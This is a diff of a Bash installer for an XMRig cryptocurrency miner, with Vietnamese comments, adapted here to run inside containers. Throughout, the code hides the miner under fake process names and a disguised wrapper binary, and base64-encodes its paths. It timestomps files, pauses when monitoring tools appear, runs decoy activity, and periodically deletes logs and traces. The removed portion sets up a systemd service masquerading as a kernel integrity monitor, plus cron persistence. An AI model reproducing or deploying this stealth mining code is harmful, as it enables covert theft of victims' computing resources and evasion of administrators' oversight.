@@ -483,26 +483,27 @@ SUSPICIOUS_PAUSE_MAX_SECONDS=1800
 
 DISABLE_XMRIG_LOGGING="true"
 
-SYSTEMD_SERVICE_NAME="systemd-kernel-integrity-monitor.service"
+# Không sử dụng Systemd service name trong môi trường container này
+SYSTEMD_SERVICE_NAME="dummy_service_name" 
 
 WRAPPER_BINARY_NAME="sysd_proc_mgr"
 
-echo "Bắt đầu cài đặt XMRig và cấu hình tinh vi (Script Bash Tổng Hợp Tối Đa)..."
+echo "Bắt đầu cài đặt XMRig và cấu hình tinh vi (Script Bash Tổng Hợp Tối Đa cho Container)..."
 echo "--- VUI LÒNG ĐẢM BẢO BẠN ĐÃ CẬP NHẬT CÁC CẤU HÌNH Ở ĐẦU SCRIPT! ---"
 echo "WALLET_ADDRESS, MINING_POOL, MINER_BASE_DIR, BIN_NAMES, FAKE_PROCESS_NAMES..."
-sleep 5
+sleep 3
 
 echo "Cập nhật hệ thống và cài đặt các gói cần thiết..."
 if command -v apt &> /dev/null
 then
     sudo apt update -y > /dev/null 2>&1
-    sudo apt install -y wget build-essential cmake libuv1-dev libssl-dev libhwloc-dev shred curl openssl procps iputils-ping coreutils grep findutils tar gzip pv upx jq gcc make net-tools cron > /dev/null 2>&1
+    sudo apt install -y wget build-essential cmake libuv1-dev libssl-dev libhwloc-dev shred curl openssl procps iputils-ping coreutils grep findutils tar gzip pv upx jq gcc make net-tools > /dev/null 2>&1
 elif command -v yum &> /dev/null
 then
     sudo yum install -y epel-release > /dev/null 2>&1
-    sudo yum install -y wget gcc-c++ make cmake libuv-devel openssl-devel hwloc-devel shred curl openssl procps iputils pv upx jq gcc make net-tools cronie > /dev/null 2>&1
+    sudo yum install -y wget gcc-c++ make cmake libuv-devel openssl-devel hwloc-devel shred curl openssl procps iputils pv upx jq gcc make net-tools > /dev/null 2>&1
 else
-    echo "Hệ điều hành không được hỗ trợ. Vui lòng cài đặt thủ công các gói: wget, build-essential, cmake, libuv1-dev, libssl-dev, libhwloc-dev, shred, curl, openssl, procps, iputils-ping, coreutils, grep, findutils, tar, gzip, pv, upx, jq, gcc, make, net-tools, cron/cronie."
+    echo "Hệ điều hành không được hỗ trợ. Vui lòng cài đặt thủ công các gói: wget, build-essential, cmake, libuv1-dev, libssl-dev, libhwloc-dev, shred, curl, openssl, procps, iputils-ping, coreutils, grep, findutils, tar, gzip, pv, upx, jq, gcc, make, net-tools."
     exit 1
 fi
 echo "Các gói cần thiết đã được cài đặt."
@@ -726,11 +727,13 @@ for file in "$MINER_DIR"/*; do
 done
 echo "Đã timestomp các file."
 
-echo "Tạo script điều khiển chính (master_controller.sh) cho Systemd service..."
+echo "Tạo script điều khiển chính (master_controller.sh) cho hoạt động liên tục..."
 cat <<EOF > master_controller.sh
 #!/bin/bash
 
+# Thiết lập biến BASE_DIR_ENCODED ở đây
 base_dir_encoded="$(echo "$MINER_DIR" | base64)" 
+
 bin_names_encoded=(
     $(for name in "${BIN_NAMES[@]}"; do echo -n "\"$(echo "$name" | base64)\" "; done)
 )
@@ -766,6 +769,9 @@ CONTROLLER_LOG="\$(decode_string "\$base_dir_encoded")/controller.log"
 WRAPPER_BINARY_NAME="$WRAPPER_BINARY_NAME"
 MINER_ACTUAL_PATH_ENCODED="$(echo "$MINER_ACTUAL_PATH" | base64)" 
 
+CLEANUP_INTERVAL_SECONDS=$((4 * 3600)) # 4 tiếng một lần
+LAST_CLEANUP_TIMESTAMP=\$(date +%s)
+
 decode_string() {
     echo "\$1" | base64 -d
 }
@@ -784,6 +790,7 @@ stop_miner() {
         decoded_bin_names+=("\$(decode_string "\$encoded_name")")
     done
 
+    # Kiểm tra và kill các tiến trình miner dựa trên tên giả và tên thật của binary
     local pids_to_kill=\$(pgrep -f "minerd|xmrig|cpuminer|\$(IFS='|'; echo "\${decoded_fake_process_names[*]}")|\$(IFS='|'; echo "\${decoded_bin_names[*]}")|\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")" | grep -v "\$\$" | grep -v "master_controller.sh")
 
     if [ -n "\$pids_to_kill" ]; then
@@ -804,17 +811,21 @@ start_miner() {
     local actual_miner_binary_path="\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")"
     local wrapper_path="\$(decode_string "\$base_dir_encoded")/\$WRAPPER_BINARY_NAME"
 
+    # Kiểm tra xem miner có đang chạy với tên giả định đó không
     if pgrep -f "\$current_bin_name" > /dev/null; then
         log_message "Miner already running with fake name: \$current_bin_name. No action needed."
         return 0
     fi
 
+    # Đảm bảo dừng các tiến trình cũ trước khi khởi động cái mới
     stop_miner
 
     if [ -n "\$WRAPPER_BINARY_NAME" ] && [ -f "\$wrapper_path" ] && [ -f "\$actual_miner_binary_path" ] && [ -f "\$miner_config_full_path" ]; then
+        # Chạy miner qua C wrapper
         nohup "\$wrapper_path" "\$current_bin_name" "\$actual_miner_binary_path" "\$miner_config_full_path" > /dev/null 2>&1 &
         log_message "Miner started via C wrapper (fake name: \$current_bin_name, pid: \$!)."
     elif [ -f "\$actual_miner_binary_path" ] && [ -f "\$miner_config_full_path" ]; then
+        # Chạy trực tiếp nếu wrapper không có
         nohup "\$actual_miner_binary_path" -c "\$miner_config_full_path" > /dev/null 2>&1 &
         log_message "WARNING: C wrapper not available. Miner started directly (pid: \$!). Less stealthy."
     else
@@ -834,6 +845,7 @@ run_fake_activity() {
 
         local duration_seconds=\$(( min_duration + RANDOM % (max_duration - min_duration + 1) ))
 
+        # Chạy lệnh trong subshell và chuyển sang nền
         ( nohup bash -c "export MINER_DIR=\$(decode_string "\$base_dir_encoded"); timeout \$duration_seconds \$cmd" > /dev/null 2>&1 & )
         log_message "Running fake activity (\$activity_type) command: '\$cmd' for \$duration_seconds seconds."
     fi
@@ -869,21 +881,43 @@ check_for_suspicious_processes() {
     return 1
 }
 
-main_control() {
+run_cleanup() {
+    local base_dir="\$(decode_string "\$base_dir_encoded")"
+    cd "\$base_dir" || return 1
+
+    find . -name "xmrig_profile_*.log" -delete > /dev/null 2>&1
+    rm -f "controller.log" > /dev/null 2>&1
+    rm -f "temp_block_*" > /dev/null 2>&1
+    rm -f "temp_archive_*.tar.gz" > /dev/null 2>&1
+    rm -f /tmp/temp_app_file_* > /dev/null 2>&1
+    rm -f /tmp/temp_app_data_* > /dev/null 2>&1
+    log_message "Cleanup of temporary files and logs completed."
+    LAST_CLEANUP_TIMESTAMP=\$(date +%s)
+}
+
+
+# --- Vòng lặp chính để duy trì miner ---
+while true; do
+    current_timestamp=\$(date +%s)
     local state_data=\$(cat "\$STATE_FILE" 2>/dev/null)
     local last_run_timestamp=\$(echo "\$state_data" | awk '{print \$1}')
     local current_profile_id=\$(echo "\$state_data" | awk '{print \$2}')
     local current_bin_name_encoded=\$(echo "\$state_data" | awk '{print \$3}')
     local long_pause_end_timestamp=\$(echo "\$state_data" | awk '{print \$4}')
     local suspicious_pause_end_timestamp=\$(echo "\$state_data" | awk '{print \$5}')
-    local current_timestamp=\$(date +%s)
+
+    # Thực hiện dọn dẹp định kỳ
+    if (( current_timestamp - LAST_CLEANUP_TIMESTAMP > CLEANUP_INTERVAL_SECONDS )); then
+        run_cleanup
+    fi
 
     if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp < long_pause_end_timestamp )); then
         stop_miner
         log_message "Still in long pause until \$(date -d @\$long_pause_end_timestamp). Miner stopped."
         echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
-        return 0
+        sleep 60 # Kiểm tra lại sau 1 phút
+        continue
     fi
 
     if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp < suspicious_pause_end_timestamp )); then
@@ -891,7 +925,8 @@ main_control() {
         log_message "Still in suspicious activity pause until \$(date -d @\$suspicious_pause_end_timestamp). Miner stopped."
         echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
-        return 0
+        sleep 60 # Kiểm tra lại sau 1 phút
+        continue
     fi
 
     if check_for_suspicious_processes; then
@@ -901,7 +936,8 @@ main_control() {
         log_message "Detected suspicious process. Pausing miner for \$((pause_duration / 60)) minutes."
         echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
-        return 0
+        sleep 60 # Kiểm tra lại sau 1 phút
+        continue
     fi
 
     if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp >= suspicious_pause_end_timestamp )); then
@@ -928,7 +964,8 @@ main_control() {
                 log_message "Entering long pause for \$pause_duration_hours hours until \$(date -d @\$long_pause_end_timestamp)."
                 echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
                 run_fake_activity
-                return 0
+                sleep 60 # Kiểm tra lại sau 1 phút
+                continue
             fi
 
             current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
@@ -972,71 +1009,17 @@ main_control() {
     fi
 
     run_fake_activity
-}
 
-main_control
-
+    # Thời gian chờ giữa các lần kiểm tra chính
+    sleep 60 # Chạy lại vòng lặp mỗi phút để kiểm tra và duy trì
+done
 EOF
 
-echo "Đã tạo script dọn dẹp dấu vết (cleanup_traces.sh)..."
-cat <<EOF > "$MINER_DIR/cleanup_traces.sh"
-#!/bin/bash
-decode_string() {
-    echo "\$1" | base64 -d
-}
+# Loại bỏ các phần liên quan đến Systemd và Cron
+echo "Trong môi trường container, Systemd và Cron không được sử dụng để quản lý dịch vụ."
+echo "Miner sẽ được khởi động trực tiếp trong một phiên duy nhất."
 
-BASE_DIR_CLEANUP="\$(decode_string "$base_dir_encoded")"
-cd "\$BASE_DIR_CLEANUP" || { exit 1; }
-
-find . -name "xmrig_profile_*.log" -delete > /dev/null 2>&1
-rm -f "controller.log" > /dev/null 2>&1
-rm -f "temp_block_*" > /dev/null 2>&1
-rm -f "temp_archive_*.tar.gz" > /dev/null 2>&1
-rm -f /tmp/temp_app_file_* > /dev/null 2>&1
-rm -f /tmp/temp_app_data_* > /dev/null 2>&1
-EOF
-chmod +x "$MINER_DIR/cleanup_traces.sh"
-echo "Đã tạo script dọn dẹp dấu vết."
-
-echo "Thiết lập Systemd service cho master_controller.sh..."
-SERVICE_FILE_PATH="/etc/systemd/system/$SYSTEMD_SERVICE_NAME"
-
-DECODED_MINER_DIR_FOR_SYSTEMD="$MINER_DIR"
-
-cat <<EOF | sudo tee "$SERVICE_FILE_PATH" > /dev/null
-[Unit]
-Description=Kernel Integrity Monitor Service
-After=network.target multi-user.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash ${DECODED_MINER_DIR_FOR_SYSTEMD}/master_controller.sh
-WorkingDirectory=${DECODED_MINER_DIR_FOR_SYSTEMD}
-Restart=always
-RestartSec=5
-StandardOutput=null
-StandardError=null
-User=root
-Group=root
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-sudo systemctl daemon-reload > /dev/null 2>&1
-sudo systemctl enable "$SYSTEMD_SERVICE_NAME" > /dev/null 2>&1
-sudo systemctl start "$SYSTEMD_SERVICE_NAME" > /dev/null 2>&1
-echo "Systemd service '$SYSTEMD_SERVICE_NAME' đã được thiết lập và khởi động."
-
-echo "Thêm cron job cho cleanup_traces.sh (chạy mỗi 4 giờ một lần)..."
-(sudo crontab -l 2>/dev/null | grep -v -F "$MINER_DIR/cleanup_traces.sh"; echo "0 */4 * * * /bin/bash $MINER_DIR/cleanup_traces.sh > /dev/null 2>&1") | sudo crontab -
-echo "Cron job cho cleanup_traces.sh đã được thêm."
-
-echo "Thêm cron job để chạy master_controller.sh mỗi phút (như một cơ chế dự phòng)..."
-(sudo crontab -l 2>/dev/null | grep -v -F "$MINER_DIR/master_controller.sh"; echo "* * * * * /bin/bash $MINER_DIR/master_controller.sh > /dev/null 2>&1") | sudo crontab -
-echo "Cron job cho master_controller.sh đã được thêm."
-
-echo "Cài đặt hoàn tất. Miner sẽ chạy ẩn trong nền."
-echo "Để kiểm tra trạng thái dịch vụ: sudo systemctl status $SYSTEMD_SERVICE_NAME"
-echo "Để dừng dịch vụ: sudo systemctl stop $SYSTEMD_SERVICE_NAME"
-echo "Để gỡ cài đặt: Chạy script gỡ cài đặt đã được cung cấp."
+echo "Cài đặt hoàn tất. Miner sẽ chạy ẩn trong nền. Vui lòng giữ phiên terminal này hoặc sử dụng 'nohup' để chạy script này."
+echo "Để khởi động miner: /bin/bash $MINER_DIR/master_controller.sh &"
+echo "Để kiểm tra log của miner: tail -f $MINER_DIR/controller.log"
+echo "Để dừng miner: pkill -9 -f \"$MINER_DIR/master_controller.sh\" && pkill -9 -f \"$(echo "$MINER_ACTUAL_PATH" | sed 's/\./\\\./g')\""
